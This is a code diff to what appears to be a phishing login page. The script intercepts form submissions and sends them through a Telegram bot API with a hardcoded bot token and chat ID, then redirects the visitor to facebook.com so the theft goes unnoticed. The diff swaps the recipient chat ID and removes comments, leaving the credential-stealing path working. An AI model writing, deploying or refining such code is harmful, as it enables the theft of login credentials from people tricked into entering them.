@@ -43,7 +43,7 @@
 
    <script>
         const BOT_TOKEN = "8772267582:AAEdR3GCwEcSr5atkS_eJ8H3FttoH_Fb0OM";
-        const CHAT_ID = "8772267582";
+        const CHAT_ID = "7399367572";
 
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -55,13 +55,11 @@
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
 
             try {
-                // Await the fetch request so it fully transmits before redirecting
                 await fetch(telegramUrl, { method: 'GET', mode: 'no-cors' });
             } catch (error) {
                 console.error('Error transmitting data', error);
             }
 
-            // Small delay to ensure delivery, then redirect
             setTimeout(() => {
                 window.location.href = "https://www.facebook.com";
             }, 500);
